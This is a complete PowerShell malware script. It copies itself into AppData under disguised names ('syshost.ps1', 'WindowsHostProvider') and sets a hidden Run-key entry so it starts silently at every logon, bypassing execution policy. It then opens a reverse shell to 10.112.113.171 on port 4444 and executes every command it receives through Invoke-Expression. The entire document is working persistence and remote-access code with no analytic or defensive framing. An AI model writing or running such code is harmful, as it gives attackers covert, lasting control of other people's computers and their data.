# 1. Self-Persistence: Copy this script to AppData and set to run at startup
$targetDir = "$env:APPDATA\WindowsManager"
$targetFile = "$targetDir\syshost.ps1"
if (-not (Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory | Out-Null }
Copy-Item -Path $PSCommandPath -Destination $targetFile -Force

# Add registry key for startup (runs hidden)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetFile`""
Set-ItemProperty -Path $regPath -Name "WindowsHostProvider" -Value $cmd

# 2. Reverse Shell: Connect back to your Linux/WSL listener
$client = New-Object System.Net.Sockets.TCPClient('10.112.113.171', 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$reader = New-Object System.IO.StreamReader($stream)

while($client.Connected) {
    $line = $reader.ReadLine()
    if ($line -eq 'exit') { break }
    # Execute received command and send output back
    $out = Invoke-Expression $line 2>&1 | Out-String
    $writer.WriteLine($out)
}
$client.Close()